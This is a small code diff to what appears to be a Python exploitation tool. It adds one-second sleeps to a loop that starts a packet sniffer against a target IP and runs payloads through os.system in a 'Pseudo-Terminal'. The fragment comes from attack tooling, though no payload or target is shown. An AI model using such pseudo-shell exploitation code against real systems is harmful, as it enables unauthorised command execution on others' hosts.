@@ -36,6 +36,7 @@ def snif(ip_dst,ip_src):
 def exploitation(ip_dst,ip_src,url,http_request_method,request_data):
   signal.signal(signal.SIGINT, signal_handler)
   sniffer_thread = threading.Thread(target=snif, args=(ip_dst,ip_src,)).start()
+  time.sleep(1)
   while True :
     print ""
     print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
@@ -64,8 +65,8 @@ def exploitation(ip_dst,ip_src,url,http_request_method,request_data):
 	    
 	sys.stdout.write(colors.GREEN + colors.BOLD + "\n")
 	os.system(payload) 
+	time.sleep(1)
 	sys.stdout.write("\n" + colors.RESET)
-	
       except:
 	print ""
 	os._exit(0)
